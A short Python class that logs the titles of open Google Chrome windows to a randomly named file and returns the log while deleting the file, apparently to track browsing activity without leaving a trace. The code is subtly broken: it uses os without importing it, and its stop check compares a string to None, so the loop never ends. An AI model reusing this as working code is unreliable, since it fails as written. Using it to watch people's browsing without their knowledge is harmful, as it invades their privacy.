import pyautogui
import uuid

class BrowserMonitor:
    def get_window_title(self):
        titles = pyautogui.getAllTitles()

        for title in titles:
            if title.endswith(' - Google Chrome'):
                return title.replace(' - Google Chrome', '')

        return None

    def start(self):
        NAME = f'{uuid.uuid4()}-browser.log'
        previous_title = str(self.get_window_title())
        with open(NAME, 'w') as f:
            f.write(f'{previous_title}\n')

        while True:
            title = str(self.get_window_title())

            if title is None:
                data = open(NAME, 'r').read()
                os.remove(NAME)

                return data
            
            if title != previous_title:
                previous_title = title
                with open(NAME, 'a') as f:
                    f.write(f'{title}\n')
                
